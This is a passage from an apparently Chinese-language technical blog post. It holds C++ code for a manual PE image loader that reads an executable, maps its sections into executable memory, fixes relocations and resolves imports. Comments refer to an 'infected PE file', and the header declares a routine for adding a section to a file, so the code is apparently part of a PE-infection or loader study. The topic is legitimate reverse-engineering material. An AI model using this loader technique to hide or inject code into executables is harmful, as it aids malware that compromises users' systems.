VirtualAddress)</span></span>;<br><span class="hljs-function">DWORD <span class="hljs-title">GetAlignedSize</span><span class="hljs-params">(DWORD BufferLength, DWORD Alignment)</span></span>;<br><span class="hljs-function">VOID  <span class="hljs-title">ProcessRelocateTable</span><span class="hljs-params">(ULONG_PTR RelocateBase)</span></span>;<br><span class="hljs-function">BOOL  <span class="hljs-title">ProcessImportTable</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function">BOOL  <span class="hljs-title">SnapThunk</span><span class="hljs-params">(HMODULE ModuleHandle,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">char</span> *Name, PBYTE ImageBase, PIMAGE_THUNK_DATA OriginalFirstThunk, PIMAGE_THUNK_DATA FirstThunk)</span></span>;<br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">LocateSectionByRva</span><span class="hljs-params">(DWORD Rva)</span></span>;<br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">LocateSectionByFileOffset</span><span class="hljs-params">(DWORD ParameterData)</span></span>;<br><span class="hljs-function">DWORD <span class="hljs-title">GetSectionPhysialPaddingSize</span><span class="hljs-params">(PIMAGE_SECTION_HEADER ImageSectionHeader)</span></span>;<br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">AddNewSectionToFile</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *SectionName, DWORD SectionSize)</span></span>;<br><span class="hljs-function">DWORD <span class="hljs-title">Raw2Rva</span><span class="hljs-params">(DWORD FileOffset)</span></span>;<br><span class="hljs-function">DWORD <span class="hljs-title">Rva2Raw</span><span class="hljs-params">(DWORD Rva)</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>2)CPEImage.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;_CPEImage.h&quot;</span></span><br><br><br>_CPEImage::_CPEImage()<br>&#123;<br>m_FileHandle = INVALID_HANDLE_VALUE;    <span class="hljs-comment">//文件句柄  </span><br>m_ModuleHandle = <span class="hljs-literal">NULL</span>;                  <span class="hljs-comment">//内存申请</span><br>m_ImageDosHeader  = <span class="hljs-literal">NULL</span>;<br>m_ImageFileHeader = <span class="hljs-literal">NULL</span>;<br>m_ImageOptionalHeader = <span class="hljs-literal">NULL</span>;<br>m_ImageSectionHeader  = <span class="hljs-literal">NULL</span>;<br>m_ImageExportDirectory  = <span class="hljs-literal">NULL</span>;<br>m_ImageImportDescriptor = <span class="hljs-literal">NULL</span>;<br>m_RelocateDataTable = <span class="hljs-literal">NULL</span>;<br><br><br>&#125;<br><br>_CPEImage::~_CPEImage()<br>&#123;<br><span class="hljs-keyword">if</span> (m_ModuleHandle!=<span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">VirtualFree</span>(m_ModuleHandle, <span class="hljs-number">0</span>, MEM_RELEASE);<br>m_ModuleHandle = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-function">PBYTE <span class="hljs-title">_CPEImage::LoadImage</span><span class="hljs-params">(HANDLE FileHandle, BOOL IsDoRelocate, ULONG_PTR RelocateBase, BOOL IsDoImport)</span></span><br><span class="hljs-function"></span>&#123;<br>WORD i = <span class="hljs-number">0</span>;<br>BYTE *v5 = <span class="hljs-literal">NULL</span>;<br>BYTE *MappedBase = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="hljs-literal">NULL</span>;<br>BOOL IsOk = FALSE;<br>DWORD FileSizeLow = <span class="hljs-number">0</span>; <span class="hljs-comment">//一般PE文件大小不会超过4G</span><br>DWORD NumberOfBytesRead = <span class="hljs-number">0</span>;<br><br>__try<br>&#123;<br><br>m_FileHandle = FileHandle;<br><span class="hljs-comment">//获取文件大小</span><br>FileSizeLow = <span class="hljs-built_in">GetFileSize</span>(m_FileHandle, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (FileSizeLow == <span class="hljs-number">0</span>)<br>&#123;<br>__leave;<br>&#125;<br><br><span class="hljs-comment">//读取PE头</span><br>DWORD NumberOfBytesToRead = (FileSizeLow &gt; BUFFER_LENGTH) ? BUFFER_LENGTH : FileSizeLow;<br><span class="hljs-built_in">ZeroMemory</span>(m_BufferData, BUFFER_LENGTH);<br><br><span class="hljs-comment">//读取被感染PE文件的0x1000大小数据</span><br>IsOk = <span class="hljs-built_in">ReadFile</span>(m_FileHandle, m_BufferData, NumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br>__leave;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">VerifyImage</span>(m_BufferData))  <span class="hljs-comment">//判断是否是一个PE文件 0x1000</span><br>&#123;<br>__leave;<br>&#125;<br><br><span class="hljs-comment">//解析各个PE头部结构</span><br><span class="hljs-built_in">InitializePeHeaders</span>(m_BufferData);<span class="hljs-comment">//导入描述 导出目录的数据信息</span><br><br><span class="hljs-comment">//定义一个游走指针</span><br>ImageSectionHeader = m_ImageSectionHeader;<br><br><br><span class="hljs-comment">//在我们进程中内存申请</span><br>v5 = m_ModuleHandle = (BYTE*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, m_SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (v5 == <span class="hljs-literal">NULL</span>)<br>&#123;<br><br>__leave;<br>&#125;<br><br><span class="hljs-comment">//现将被感染PE文件中的头部数据拷贝到内存中</span><br><span class="hljs-built_in">memcpy</span>(v5, m_BufferData, m_ImageOptionalHeader-&gt;SizeOfHeaders);  <span class="hljs-comment">//0x200    ---  0x1000</span><br><br><span class="hljs-comment">//按照内存粒度对齐整理文件头部信息</span><br>v5 += <span class="hljs-built_in">GetAlignedSize</span>(m_ImageOptionalHeader-&gt;SizeOfHeaders, m_ImageOptionalHeader-&gt;SectionAlignment);<br><br><br><br><span class="hljs-comment">//整理节数据</span><br><br><span class="hljs-comment">//逆向工程核心原理104 图对照   v5内存粒度对齐图</span><br>LARGE_INTEGER v1;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; m_NumberOfSections; i++)<br>&#123;<br>v1.QuadPart = ImageSectionHeader-&gt;PointerToRawData;<br>IsOk = <span class="hljs-built_in">SetFilePointerEx</span>(m_FileHandle, v1, <span class="hljs-literal">NULL</span>, FILE_BEGIN);   <span class="hljs-comment">//根据PointerToRawData中的值定位文件位置</span><br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br>__leave;<br>&#125;<br><br><span class="hljs-comment">//读取各个节</span><br>IsOk = <span class="hljs-built_in">ReadFile</span>(m_FileHandle, v5, ImageSectionHeader-&gt;SizeOfRawData, &amp;NumberOfBytesRead, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><br>__leave;<br>&#125;<br>v5 += <span class="hljs-built_in">GetAlignedSize</span>(ImageSectionHeader-&gt;Misc.VirtualSize, m_ImageOptionalHeader-&gt;SectionAlignment);<br>ImageSectionHeader++;<br>&#125;<br><br><span class="hljs-comment">//重新解析PE头</span><br><span class="hljs-built_in">InitializePeHeaders</span>(m_ModuleHandle);<br><br><span class="hljs-comment">//开始处理重定位数据</span><br><span class="hljs-keyword">if</span> (IsDoRelocate)<br>&#123;<br><span class="hljs-comment">//如果RelocateBase为0，则按实际加载位置进行重定位</span><br>ULONG_PTR v2 = (RelocateBase == <span class="hljs-number">0</span>) ? (DWORD)m_ModuleHandle : RelocateBase;<br><span class="hljs-built_in">ProcessRelocateTable</span>(v2);<br>&#125;<br><br><span class="hljs-comment">//处理导入表</span><br><span class="hljs-keyword">if</span> (IsDoImport)<br>&#123;<br><span class="hljs-built_in">ProcessImportTable</span>();<br>&#125;<br><br>IsOk = TRUE; <span class="hljs-comment">//加载成功</span><br>&#125;<br>__finally<br>&#123;<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><span class="hljs-keyword">if</span> (m_FileHandle != INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(m_FileHandle);<br>m_FileHandle = INVALID_HANDLE_VALUE;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> m_ModuleHandle;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">_CPEImage::VerifyImage</span><span class="hljs-params">(PVOID VirtualAddress)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//解析各个PE头部结构</span><br>m_ImageDosHeader = (PIMAGE_DOS_HEADER)VirtualAddress;<br><span class="hljs-keyword">if</span> (m_ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>m_ImageNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)VirtualAddress + m_ImageDosHeader-&gt;e_lfanew);<br><span class="hljs-keyword">if</span> (m_ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">_CPEImage::InitializePeHeaders</span><span class="hljs-params">(PBYTE VirtualAddress)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//解析各个PE头部结构</span><br>m_ModuleHandle = VirtualAddress;<br>m_ImageDosHeader = (PIMAGE_DOS_HEADER)VirtualAddress;<br>m_ImageNtHeaders = (PIMAGE_NT_HEADERS)(VirtualAddress + m_ImageDosHeader-&gt;e_lfanew);<br>m_ImageFileHeader = &amp;m_ImageNtHeaders-&gt;FileHeader;<br>m_NumberOfSections = m_ImageFileHeader-&gt;NumberOfSections;<br>m_ImageOptionalHeader = &amp;m_ImageNtHeaders-&gt;OptionalHeader;<br>m_RelocateDataTable = &amp;(m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);  <span class="hljs-comment">//VirtualAddress  Size</span><br>m_ImageSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)m_ImageOptionalHeader + m_ImageFileHeader-&gt;SizeOfOptionalHeader);<br>m_AddressOfEntryPoint = m_ImageOptionalHeader-&gt;AddressOfEntryPoint;  <span class="hljs-comment">//RVA</span><br>m_SizeOfImage = m_ImageOptionalHeader-&gt;SizeOfImage;                 <br>m_ImageBase = (ULONG_PTR)m_ImageOptionalHeader-&gt;ImageBase;<br><br><span class="hljs-comment">//导入表</span><br>m_ImportDataTable = &amp;m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];<br><span class="hljs-comment">//因为导入表可能会被修改，所以先保存旧的导入表数据</span><br>m_OldImportDataTable.VirtualAddress = m_ImportDataTable-&gt;VirtualAddress;<br>m_OldImportDataTable.Size = m_ImportDataTable-&gt;Size;<br><br><span class="hljs-keyword">if</span> (m_ImportDataTable-&gt;VirtualAddress != <span class="hljs-literal">NULL</span>)<br>&#123;<br>m_ImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(VirtualAddress + m_ImportDataTable-&gt;VirtualAddress);<br>&#125;<br><br><span class="hljs-comment">//导出表</span><br>m_ExportDataTable = &amp;m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<br><span class="hljs-keyword">if</span> (m_ExportDataTable-&gt;VirtualAddress != <span class="hljs-literal">NULL</span>)<br>&#123;<br>m_ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(VirtualAddress + m_ExportDataTable-&gt;VirtualAddress);<br>&#125;<br><br><br><br>&#125;<br><br><br><span class="hljs-function">DWORD <span class="hljs-title">_CPEImage::GetAlignedSize</span><span class="hljs-params">(DWORD BufferLength, DWORD Alignment)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD v1 = <span class="hljs-number">0</span>;<br>v1 = <span class="hljs-built_in">ALIGN_SIZE_UP</span>(BufferLength, Alignment);<br><span class="hljs-keyword">return</span> v1;<span class="hljs-comment">//返回对齐后的大小</span><br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">_CPEImage::ProcessRelocateTable</span><span class="hljs-params">(ULONG_PTR RelocateBase)</span></span><br><span class="hljs-function"></span>&#123;<br>WORD i = <span class="hljs-number">0</span>;<br><br>PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)(RelocateBase + ((PIMAGE_DOS_HEADER)RelocateBase)-&gt;e_lfanew);<br><br>PIMAGE_DATA_DIRECTORY ImageDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;((PIMAGE_NT_HEADERS)ImageNtHeaders)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];<br>PIMAGE_BASE_RELOCATION ImageBaseRelocation = (PIMAGE_BASE_RELOCATION)(RelocateBase + ((PIMAGE_DATA_DIRECTORY)ImageDataDirectory)-&gt;VirtualAddress);<br><br><span class="hljs-keyword">if</span> (ImageBaseRelocation-&gt;VirtualAddress != <span class="hljs-literal">NULL</span>)<br>&#123;<br><br><span class="hljs-keyword">do</span><br>&#123;<span class="hljs-comment">//处理一个接一个的重定位块，最后一个重定位块以RAV=0结束</span><br><span class="hljs-comment">//需要重定位的个数，是本块的大小减去块头的大小，结果是以DWORD表示的大小</span><br><span class="hljs-comment">//而重定位数据是16位的，那就得除以2</span><br><span class="hljs-type">int</span> v7 = (ImageBaseRelocation-&gt;SizeOfBlock - <span class="hljs-built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">//重定位数据是16位的</span><br>WORD Offset = <span class="hljs-number">0</span>;<br>WORD *v1 = (WORD*)((BYTE*)ImageBaseRelocation + <span class="hljs-built_in">sizeof</span>(IMAGE_BASE_RELOCATION));<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; v7; i++)<span class="hljs-comment">//循环，或直接判断*pData是否为0也可以作为结束标记</span><br>&#123;<br>ULONG_PTR *RelocateAddress = <span class="hljs-number">0</span>;<span class="hljs-comment">//需要重定位的地址</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br>WORD RelocateFlag = IMAGE_REL_BASED_DIR64;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>WORD RelocateFlag = IMAGE_REL_BASED_HIGHLOW;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//IMAGE_REL_BASED_DIR64</span><br><span class="hljs-comment">//重定位的高4位是重定位类型，</span><br><span class="hljs-keyword">if</span> (((*v1) &gt;&gt; <span class="hljs-number">12</span>) == RelocateFlag)<span class="hljs-comment">//判断重定位类型是否为IMAGE_REL_BASED_HIGHLOW,x86</span><br>&#123;<br><span class="hljs-comment">//计算需要进行重定位的地址</span><br><span class="hljs-comment">//重定位数据的低12位再加上本重定位块头的RAV即真正需要重定位的数据的RAV</span><br>Offset = (*v1) &amp; <span class="hljs-number">0xFFF</span>;<span class="hljs-comment">//小偏移</span><br>RelocateAddress = (ULONG_PTR*)(RelocateBase + ImageBaseRelocation-&gt;VirtualAddress + Offset);<br><span class="hljs-comment">//对需要重定位的数据进行修正</span><br><span class="hljs-comment">//修正方法:减去IMAGE_OPTINAL_HEADER中的基址，再加上新的基址即可</span><br>*RelocateAddress = *RelocateAddress - m_ImageOptionalHeader-&gt;ImageBase + RelocateBase;<br>&#125;<br>v1++;<br><br>&#125;<br><span class="hljs-comment">//指向下一个重定位块</span><br>ImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((<span class="hljs-type">char</span>*)ImageBaseRelocation + ImageBaseRelocation-&gt;SizeOfBlock);<br><br>&#125; <span class="hljs-keyword">while</span> (ImageBaseRelocation-&gt;VirtualAddress);<br>&#125;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">_CPEImage::ProcessImportTable</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL IsOk = TRUE;<br>TCHAR v1[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">char</span> szCurDirectory[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">char</span> szPrompt[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>PIMAGE_IMPORT_DESCRIPTOR  ImageImportDescriptor = m_ImageImportDescriptor;<br>PIMAGE_THUNK_DATA         OriginalFirstThunk = <span class="hljs-literal">NULL</span>, FirstThunk = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME  pImpName = <span class="hljs-literal">NULL</span>;<br>HMODULE ModuleHandle = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span> *Name = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (ImageImportDescriptor == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">//无导入表，不需要处理</span><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">while</span> (ImageImportDescriptor-&gt;Name &amp;&amp; ImageImportDescriptor-&gt;OriginalFirstThunk)<br>&#123;<br>Name = (<span class="hljs-type">char</span>*)m_ModuleHandle + ImageImportDescriptor-&gt;Name;<br>ModuleHandle = <span class="hljs-built_in">LoadLibraryA</span>(Name);<br><span class="hljs-keyword">if</span> (ModuleHandle == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">//printf(&quot;处理导入表模块 : %s\n&quot;,szImpModName);</span><br>OriginalFirstThunk = (PIMAGE_THUNK_DATA)(m_ModuleHandle + (ULONG)ImageImportDescriptor-&gt;OriginalFirstThunk);<br>FirstThunk = (PIMAGE_THUNK_DATA)(m_ModuleHandle + (ULONG)ImageImportDescriptor-&gt;FirstThunk);<br><br><span class="hljs-keyword">while</span> (OriginalFirstThunk-&gt;u1.AddressOfData)<br>&#123;<br>IsOk = <span class="hljs-built_in">SnapThunk</span>(ModuleHandle, Name, m_ModuleHandle, OriginalFirstThunk, FirstThunk);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br>IsOk = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>OriginalFirstThunk++;<br>FirstThunk++;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><span 